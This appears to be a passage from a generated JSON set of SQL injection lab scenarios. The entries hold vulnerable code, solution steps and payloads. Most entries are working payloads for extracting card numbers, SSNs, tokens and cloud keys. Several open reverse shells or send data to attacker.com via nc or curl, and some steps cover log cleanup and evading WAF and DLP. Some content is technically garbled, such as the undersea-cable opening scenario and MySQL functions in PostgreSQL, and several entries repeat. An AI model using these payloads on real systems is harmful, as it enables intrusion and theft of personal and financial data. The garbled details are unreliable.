    "Lab Description": "An undersea DWDM network maps OTN OPU payloads to PostgreSQL BLOB queries. Attackers can inject GFP-T frames containing hex-encoded UNION payloads to exfiltrate BGP peering keys. Requires precise alignment with ODUflex containers and bypassing FEC checks using soft-decision decoding.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Tap submarine cable using OTDR reflector",
      "Encode payload: 0xDEADBEEF UNION SELECT encode(privkey,'hex') FROM bgp_peers--",
      "Bypash BIP-8 checks using bit-error injection",
      "Reassemble exfiltrated keys from MFASplit2.5G signals",
      "Hijack IP transit routes using stolen ASN credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void process_opu(uint8_t* payload) {\n  char hex[2048];\n  bytes_to_hex(payload, hex, 1024);\n  PGresult* res = PQexec(conn, \"INSERT INTO otn_frames VALUES (decode('\"+hex+\"','hex'))\");\n}",
    "payloads": [
      "'\\xDEAD' WHERE 1=0 UNION SELECT pg_read_file('/etc/bird/bird.conf')--",
      "'\\xCAFE'::bytea || (SELECT mtu FROM network_config)--"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi via GraphQL Batch Query",
    "Lab Description": "Headless CMS implements vulnerable GraphQL resolvers that concatenate user input into PostgreSQL pg_sleep() calls. The Java backend suppresses errors but leaks timing differentials through N+1 query patterns. To solve: Exfiltrate admin API keys through conditional response delays using DNS-over-HTTPS tunneling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL query with Apollo Client DevTools",
      "Identify injectable field using nested mutations",
      "Set up Canarytokens.org DNS listener",
      "Craft time-based payload: ' OR CASE WHEN (SELECT 1) THEN pg_sleep(5) ELSE 0 END--",
      "Correlate delays with ASCII values using Python's time.perf_counter()"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    posts(_, { filter }) {\n      return db.query(`SELECT * FROM posts WHERE ${filter}`);\n    }\n  }\n};",
    "payloads": [
      "1=1; SELECT CASE WHEN (ASCII(SUBSTR(apikey,1,1))>100) THEN pg_sleep(5) END FROM admins--",
      "')) OR (SELECT LOAD_EXTENSION('\\\\attacker.com\\evil.dll'))--"
    ]
  },
  {
    "Lab scenario": "API Gateway Error-Based SQLi in JSON Array",
    "Lab Description": "Inventory management system processes JSON arrays directly in WHERE clauses with MySQL. The application leaks full error messages containing AWS RDS instance metadata through verbose logging. To solve: Extract DynamoDB access keys using geometry type conversion errors in MULTIPOINT() functions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\": [\"1=1 AND ST_GeomFromText('POINT('||(SELECT access_key)||')')\"]}",
      "Parse AWS credentials from spatial function errors",
      "Bypass column count restrictions using JSON_OBJECT()",
      "Validate keys through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.sqlMessage);\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "\"1' UNION SELECT NULL,JSON_OBJECT('key', access_key),NULL FROM aws_creds--\"",
      "\"1 AND ST_GeomFromText(CONCAT('POINT(', (SELECT secret_key), ')') IS NULL--\""
    ]
  },
  {
    "Lab scenario": "E-Commerce UNION-Based SQLi with Column Padding",
    "Lab Description": "Product search feature uses fixed-width UNION column validation in MySQL. The application truncates overflow data but leaks information through JSON encoding errors. To solve: Bypass column count restrictions using NULL padding and extract PCI-compliant credit card numbers through CONCAT(LPAD()) length exploitation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /products?category=electronics",
      "Determine base column count using ORDER BY 5--",
      "Craft payload: ' UNION SELECT NULL,CONCAT(pan,' ',expiry),NULL,NULL,NULL FROM payments--",
      "Bypass JSON encoding errors using HEX() and SUBSTRING()",
      "Reconstruct full PANs from truncated responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products\n    WHERE category='${category}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,2,3,4,5 FROM users--",
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Social Media Boolean-Based Blind SQLi in DM Search",
    "Lab Description": "Direct message search functionality uses unsanitized input in SQL Server FULLTEXT predicates. The .NET backend suppresses errors but reveals truthiness through emoji reaction counts. To solve: Exfiltrate OAuth tokens through BITAND() comparisons of UNICODE() values.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /search-dms with Fiddler",
      "Identify boolean trigger: ' OR 1=1 AND 'a'='a vs 1=0",
      "Automate with Python Requests using ternary bitwise operators",
      "Brute-force token characters using response length analysis",
      "Validate tokens through OAuth introspection endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search-dms', (req, res) => {\n  const term = req.body.term;\n  const query = `SELECT * FROM messages\n    WHERE CONTAINS(text, '${term}')`;\n  \n  sql.query(query, (err, result) => {\n    res.json({ count: result.recordset.length });\n  });\n});",
    "payloads": [
      "' OR (SELECT BITAND(ASCII(SUBSTR(token,1,1)),128)=128 FROM oauth)--",
      "' AND (SELECT COUNT(*) FROM oauth WHERE client_id='admin')=1--"
    ]
  },
  {
    "Lab scenario": "REST API Error-Based SQLi in JWT Claims",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' claim directly into SQL Server OPENJSON queries. The application leaks decrypted sensitive columns through XML FOR JSON PATH conversion errors. To solve: Extract encrypted SSNs by forcing type mismatches in JSON_VALUE() path expressions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature validation using 'none' algorithm",
      "Parse JSON conversion errors containing SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users\n    WHERE id = '${userId}'`;\n  \n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND 1=CAST((SELECT COUNT(*) FROM sys.databases) AS INT)--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi in Audit Logs",
    "Lab Description": "User activity tracking system incorporates X-Forwarded-For headers into MySQL INSERT statements. The PHP backend suppresses errors but reveals query success through UUID generation patterns. To solve: Extract admin password hashes using BENCHMARK() timing attacks and rainbow table reversal.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Forwarded-For",
      "Identify timing differential: ' OR BENCHMARK(1000000,MD5('test'))--",
      "Automate with Python's Requests Session and time thresholds",
      "Brute-force hash characters using response time variances",
      "Crack MD5 hashes using CrackStation API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs (ip) VALUES ('${ip}')`;\n  mysql.query(query);\n  next();\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(password,1,1))>97,BENCHMARK(1000000,MD5('a')),0)--",
      "' AND (SELECT COUNT(*) FROM mysql.user WHERE super_priv='Y')=1--"
    ]
  },
  {
    "Lab scenario": "Banking App Time-Based SQLi in OAuth Callback",
    "Lab Description": "OAuth 2.0 token exchange endpoint incorporates state parameters into SQLite queries. The Go backend leaks query execution time through improperly batched database transactions. To solve: Exfiltrate transaction PINs using CASE WHEN delays and statistical timing analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept /oauth/callback?state=123 with Charles Proxy",
      "Identify time differential: ' OR CASE WHEN 1=1 THEN randomblob(1000000) ELSE 0 END--",
      "Automate with sqlmap --time-sec=5 --technique=T",
      "Brute-force 6-digit PIN using binary search algorithm",
      "Validate PIN through ATM simulator API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/oauth/callback', (req, res) => {\n  const state = req.query.state;\n  const query = `SELECT user_id FROM oauth_states\n    WHERE state='${state}'`;\n  \n  db.get(query, (err, row) => {\n    if (row) res.redirect('/dashboard');\n    else res.status(400).send('Invalid state');\n  });\n});",
    "payloads": [
      "' OR CASE WHEN (SUBSTR(pin,1,1)='5' THEN randomblob(1000000) ELSE 0 END--",
      "' AND (SELECT LENGTH(pin) FROM users WHERE username='admin')=6--"
    ]
  },
  {
    "Lab scenario": "Telemedicine Platform Error-Based SQLi in DICOM Metadata",
    "Lab Description": "Medical imaging system stores DICOM tags in MySQL GEOMETRY columns. The Python backend leaks patient diagnoses through invalid WKB format exceptions. To solve: Extract radiation therapy records using POLYGON() type conversion attacks and ST_AsText() function exploitation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload DICOM with malicious PatientID: ' OR ST_GeomFromText(CONCAT('POINT(', diagnosis, ')')--",
      "Analyze WKT parsing errors containing diagnosis info",
      "Automate exfiltration using OpenCV DICOM parser",
      "Bypass HIPAA encryption using spatial function buffer overflows",
      "Validate data through PACS server queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload', (req, res) => {\n  const patientId = extractDICOMTag(req.file, '00100020');\n  const query = `INSERT INTO images (patient_id)\n    VALUES ('${patientId}')`;\n  \n  mysql.query(query);\n  res.send('Upload successful');\n});",
    "payloads": [
      "' OR ST_GeomFromText('POINT(' || (SELECT diagnosis) || ')')--",
      "' AND (SELECT ST_Contains(ST_GeomFromText('POLYGON(...)'), sensitive_areas) FROM facilities)--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Second-Order SQLi in Patient Notes",
    "Lab Description": "A patient record system stores unsanitized medical notes that get concatenated into nightly backup SQL queries. The MySQL backend allows attackers to poison audit logs through delayed payload execution. This lab demonstrates how to leak sensitive diagnoses via batch job error messages using time-triggered subqueries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Update patient notes: '; SET @d = (SELECT SLEEP(5) FROM diagnoses LIMIT 1)--",
      "2. Wait for 2 AM backup job execution",
      "3. Monitor systemd logs for query timeouts",
      "4. Correlate sleep duration with diagnosis record existence",
      "5. Extract specific data using conditional error triggers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/patient-notes', (req, res) => {\n  const notes = req.body.notes;\n  const query = `UPDATE patients \n    SET notes = '${notes}'\n    WHERE id = ${req.params.id}`;\n\n  pool.query(query, (err) => {\n    res.send('Notes updated');\n  });\n});",
    "payloads": [
      "'; IF(ASCII(SUBSTR(diagnosis,1,1))=67,SLEEP(10),0)--",
      "' UNION SELECT NULL,diagnosis,NULL FROM diagnoses INTO OUTFILE '/var/www/leak.txt'--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Boolean-Blind SQLi in HAVING Clause",
    "Lab Description": "The device analytics page uses unsanitized input in HAVING conditions with identical success/failure responses. The SQLite backend allows boolean inference through HTTP status codes. To solve: Determine device API keys through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz HAVING parameter",
      "Identify boolean trigger: ' HAVING 1=1 -- vs 1=0",
      "Automate with sqlmap: sqlmap -u '...' --technique=B --level=5",
      "Brute-force API key using substring binary search",
      "Validate keys through device control API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings GROUP BY sensor_id HAVING ${filter}`;\n  db.all(query, (err, rows) => {\n    res.status(rows.length > 0 ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT SUBSTR(api_key,1,1) FROM devices)='a'",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='credentials')"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in Transaction Sorting",
    "Lab Description": "The transaction history page directly incorporates user-controlled parameters into PostgreSQL ORDER BY clauses without sanitization. The application leaks column count through verbose error messages in debug mode. To solve: Extract account numbers and balances using NULL-padded UNION payloads while evading WAF restrictions with whitespace obfuscation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /transactions?sort=date with Burp Suite",
      "Determine column count using ' ORDER BY 7-- payloads",
      "Craft payload: ' UNION SELECT NULL,account::text,balance,NULL,NULL,NULL FROM accounts--",
      "Bypass WAF using %0A newline encoding",
      "Validate data through funds transfer API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT id, amount, date, recipient, status, currency, user_id\n    FROM transactions ORDER BY ${sort}`;\n  console.error('DEBUG:', query);\n  pool.query(query, (err, result) => {\n    res.json(err ? {error: err.message} : result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,version(),NULL,NULL,NULL,NULL,NULL--",
      "'%0AUNION%0ASELECT%0ANULL,account,balance,NULL,NULL,NULL%0AFROM%0Aaccounts--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in Sensor Filter",
    "Lab Description": "Device telemetry dashboard uses unsanitized HAVING clauses in SQLite queries. The application returns HTTP 200/404 status codes through misconfigured REST error handling. To solve: Extract device API keys through bitwise binary search of SUBSTR(hex(key),1,1) comparisons.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /sensor-data endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND 'a'='a",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force API key using bit-shifting analysis",
      "Verify keys through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-data', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT hex(substr(api_key,1,1)) FROM devices)='41'",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='credentials')"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi via GraphQL Batch Query",
    "Lab Description": "Headless CMS implements vulnerable resolver that concatenates user input into PostgreSQL pg_sleep() calls. The Java backend leaks timing differentials through N+1 query patterns. To solve: Exfiltrate admin credentials through conditional response delays using DNS-over-HTTPS tunneling.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture GraphQL query with Apollo Client DevTools",
      "Identify injectable field using nested mutations",
      "Set up Canarytokens.org DNS listener",
      "Craft payload: ') OR CASE WHEN (ASCII(SUBSTR(password,1,1))>97 THEN pg_sleep(5) END--",
      "Correlate delays with Python's time.perf_counter()"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    user(_, { id }) {\n      return db.query(`SELECT * FROM users WHERE id='${id}'`);\n    }\n  }\n};",
    "payloads": [
      "')) OR (SELECT pg_sleep(5) FROM admins WHERE username='admin'--",
      "'||(SELECT CASE WHEN LENGTH(password)=32 THEN pg_sleep(3) END)--"
    ]
  },
  {
    "Lab scenario": "API Gateway Error-Based SQLi in JSON Parameter",
    "Lab Description": "Inventory management system processes JSON arrays directly in WHERE clauses with MySQL. The application leaks AWS RDS metadata through geometry function conversion errors. To solve: Extract S3 credentials using ST_GeomFromText() type juggling attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\":[\"1=ST_GeomFromText(CONCAT('POINT(',access_key,')')\"]}",
      "Parse AWS keys from spatial function errors",
      "Bypass column restrictions using JSON_OBJECT()",
      "Validate credentials through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  pool.query(query, (err, result) => {\n    res.json(err ? {error: err.sqlMessage} : result.rows);\n  });\n});",
    "payloads": [
      "\"1' UNION SELECT NULL,JSON_OBJECT('key',secret_key),NULL FROM aws_creds--\"",
      "\"1 AND ST_GeomFromText('POINT('||(SELECT access_key)||')') IS NULL--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Second-Order SQLi in Patient Notes",
    "Lab Description": "Patient registration system stores unsanitized notes used in nightly HL7 report generation. The PostgreSQL backend allows stacked queries through JDBC batch updates. To solve: Execute reverse shell via COPY FROM PROGRAM during report generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register patient with notes: '); CREATE TABLE exfil (cmd_output TEXT)--",
      "Wait for 02:00 AM report job",
      "Inject payload: '); COPY exfil FROM PROGRAM 'nc attacker.com 4444 -e /bin/sh'--",
      "Monitor netcat listener for shell access",
      "Escalate privileges using SET ROLE admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const notes = req.body.notes;\n  const query = `INSERT INTO patients (notes) VALUES ('${notes}')`;\n  pool.query(query);\n  res.send('Registration pending review');\n});",
    "payloads": [
      "'); CREATE ROLE attacker SUPERUSER LOGIN PASSWORD 'pwn3d'--",
      "'); COPY (SELECT * FROM diagnoses) TO PROGRAM 'curl https://attacker.com/?exfil=$(base64 /data)'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce UNION-Based SQLi with Type Juggling",
    "Lab Description": "Product filter uses strict column type validation in MySQL. The application leaks truncated data through JSON encoding errors. To solve: Extract credit card numbers using CONCAT(LPAD()) length exploitation and NULL padding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /products?category=electronics",
      "Determine column count with ' ORDER BY 5--",
      "Craft payload: ' UNION SELECT NULL,CONCAT(pan,' ',expiry),NULL,NULL,NULL FROM payments--",
      "Bypass truncation using HEX() and SUBSTRING()",
      "Reconstruct full PANs from partial responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products\n    WHERE category='${category}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL--",
      "' UNION SELECT NULL,@@version,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Social Media Boolean-Blind SQLi in Direct Messages",
    "Lab Description": "Message search functionality uses unsanitized input in SQL Server CONTAINS predicates. The .NET backend reveals query truthiness through emoji reaction counts. To solve: Extract OAuth tokens through BITAND() ASCII comparisons.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /search-dms with Fiddler",
      "Identify boolean trigger: ' OR 1=1 AND 'a'='a",
      "Automate with Python Requests using bitwise analysis",
      "Brute-force token characters using response length",
      "Validate tokens through OAuth introspection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search-dms', (req, res) => {\n  const term = req.body.term;\n  const query = `SELECT * FROM messages\n    WHERE CONTAINS(text, '${term}')`;\n  sql.query(query, (err, result) => {\n    res.json({ count: result.recordset.length });\n  });\n});",
    "payloads": [
      "' OR (SELECT ASCII(SUBSTR(token,1,1))&128=128 FROM oauth)--",
      "' AND (SELECT COUNT(*) FROM sys.databases)=5--"
    ]
  },
  {
    "Lab scenario": "REST API Error-Based SQLi in JWT Claims",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' directly into SQL Server OPENJSON queries. The application leaks SSNs through XML conversion errors. To solve: Extract encrypted SSNs using JSON_VALUE() type mismatches.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature using 'none' algorithm",
      "Parse JSON errors for SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users\n    WHERE id = '${userId}'`;\n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Stacked Queries via MQTT",
    "Lab Description": "Device config updates process MQTT payloads in PostgreSQL without validation. The C++ backend allows stacked queries through libpq's PQexec(). To solve: Execute reverse shell via COPY FROM PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Subscribe to device/update topic with mosquitto_sub",
      "Publish payload: '; COPY devices FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f'--",
      "Bypass payload size limits via chunking",
      "Monitor netcat listener for shell access",
      "Escalate privileges using SET ROLE admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void mqttCallback(char* topic, byte* payload) {\n  char query[256];\n  snprintf(query, sizeof(query),\n    \"UPDATE devices SET config = '%s'\",\n    payload);\n  PQexec(conn, query);\n}",
    "payloads": [
      "'; DROP TABLE audit_logs CASCADE--",
      "'; CREATE SERVER exfil FOREIGN DATA WRAPPER dblink_fdw--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi in Audit Logs",
    "Lab Description": "Audit logging system incorporates X-Forwarded-For headers into MySQL INSERTs. The PHP backend reveals query success through UUID patterns. To solve: Extract password hashes using BENCHMARK() timing attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Forwarded-For",
      "Identify timing differential: ' OR BENCHMARK(1000000,MD5('test'))--",
      "Automate with Python Requests and timing thresholds",
      "Brute-force hash characters using response times",
      "Crack hashes using CrackStation API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs (ip) VALUES ('${ip}')`;\n  mysql.query(query);\n  next();\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(password,1,1))>97,BENCHMARK(1000000,MD5('a')),0)--",
      "' AND (SELECT COUNT(*) FROM mysql.user WHERE super_priv='Y')=1--"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION-Based SQLi in PDF Export",
    "Lab Description": "Report generation feature concatenates user input into PostgreSQL COPY TO statements. The Java backend allows UNION injections in CSV headers. To solve: Exfiltrate classified docs via hex-encoded LOAD_FILE().",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /export with Burp Suite",
      "Craft payload: ') UNION SELECT NULL,ENCODE(LOAD_FILE('/secret/2024.pdf'),'hex')--",
      "Bypass CSV escaping using tab separators",
      "Reconstruct PDF from hex-encoded response",
      "Bypass DLP policies via chunked encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const filter = req.body.filter;\n  const query = `COPY (SELECT * FROM reports WHERE ${filter})\n    TO STDOUT CSV HEADER`;\n  pool.query(query);\n  res.attachment('report.csv');\n});",
    "payloads": [
      "1) UNION SELECT NULL,current_setting('data_directory')--",
      "0); COPY (SELECT * FROM classified) TO PROGRAM 'curl https://attacker.com/?exfil=$(base64)'--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in HAVING Clause",
    "Lab Description": "Device telemetry aggregation uses unsanitized HAVING conditions in SQLite queries. The REST API returns HTTP 200 for true conditions and 404 for false through misconfigured rowCount checks. To solve: Extract AWS IoT Core certificates via bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using automated response analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /telemetry endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND hex(randomblob(1))='AA'--",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force certificate using Python Requests with bit-shifting logic",
      "Validate cert through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemetry', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='credentials')"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Time-Based SQLi in Patient Lookup",
    "Lab Description": "Patient search functionality uses unsanitized input in MySQL WHERE clauses with identical error pages. The application leaks query truthiness through response timing variations in JSON Web Token generation. To solve: Exfiltrate medical record IDs through conditional SLEEP(3) delays correlated with ASCII value ranges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /api/patient-search with Burp Suite",
      "Identify timing trigger: ' OR IF(ASCII(SUBSTR(record_id,1,1))>97,SLEEP(3),0)--",
      "Automate with Python Requests and 0.1s timing thresholds",
      "Brute-force record IDs using binary search algorithm",
      "Validate through HL7 FHIR API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/patient-search', (req, res) => {\n  const ssn = req.body.ssn;\n  const query = `SELECT * FROM patients WHERE ssn='${ssn}'`;\n  \n  db.query(query, (err, result) => {\n    const token = jwt.sign({found: result.length > 0}, 'weak-secret');\n    res.json({token});\n  });\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(record_id,1,1))>97,BENCHMARK(1000000,MD5('a')),0)--",
      "' AND (SELECT LENGTH(record_id) FROM medical_records)=36--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform UNION-Based SQLi in JSON Filter",
    "Lab Description": "Product search API processes JSON array filters directly in PostgreSQL WHERE clauses. The Node.js backend allows type confusion attacks through improper array validation. To solve: Bypass parameterized queries using nested JSON objects and extract credit card tokens through base64-encoded UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT NULL,ENCODE(token::bytea,'base64') FROM payments--\"}]}",
      "Bypass WAF using \\u0027 Unicode escapes",
      "Decode base64 results using CyberChef",
      "Validate tokens through payment gateway sandbox"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT version(),NULL--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT pg_read_file('/etc/passwd'),NULL--\"}]"
    ]
  },
  {
    "Lab scenario": "Government Portal Error-Based SQLi in PDF Export",
    "Lab Description": "Report generation feature constructs vulnerable COPY queries with user-controlled ORDER BY clauses. The Java backend leaks AWS credentials through verbose PostgreSQL errors containing IAM role details. To solve: Exfiltrate access keys using CTE expressions and forced geometry conversion errors.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /export?sort=date with Burp Suite",
      "Inject: date UNION SELECT NULL,aws_credentials FROM iam_roles--",
      "Bypass CSV escaping using tab characters (CHR(9))",
      "Parse leaked credentials from geometry parsing errors",
      "Validate through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort;\n  const query = `COPY (\n    SELECT * FROM reports ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n  \n  pool.query(query);\n  res.attachment('report.csv');\n});",
    "payloads": [
      "date); WITH exfil AS (SELECT * FROM iam_roles) SELECT * FROM exfil--",
      "id UNION SELECT NULL,ST_GeomFromText('POINT(' || access_key || ')')--"
    ]
  },
  {
    "Lab scenario": "CMS Second-Order SQLi in User Registration",
    "Lab Description": "User registration stores unsanitized input used in nightly report generation. The MySQL backend allows stacked queries through batched statement execution. To solve: Trigger delayed reverse shell during batch processing using temp table creation and LOAD_FILE() exploitation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register user with payload: '); CREATE TEMP TABLE exfil(cmd_output TEXT)--",
      "Inject follow-up payload: '); COPY exfil FROM PROGRAM 'nc attacker.com 4444 -e /bin/sh'--",
      "Monitor netcat listener during 02:00 AM batch job",
      "Escalate privileges using SET ROLE admin",
      "Clean logs via VACUUM FULL"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const bio = req.body.bio;\n  const query = `INSERT INTO users (bio) VALUES ('${bio}')`;\n  \n  pool.query(query);\n  res.send('Registration pending approval');\n});",
    "payloads": [
      "'); SELECT pg_sleep(10); COPY users TO PROGRAM 'curl https://attacker.com'--",
      "'); CREATE SERVER exfil FOREIGN DATA WRAPPER file_fdw--"
    ]
  },
  {
    "Lab scenario": "API Gateway UNION SQLi in JWT Claim Processing",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' claims directly into SQL Server OPENJSON queries. The .NET backend leaks encrypted SSNs through XML conversion errors. To solve: Extract sensitive data using forced type mismatches in JSON_VALUE() path expressions.",
    "Difficulty Level": "Medium",
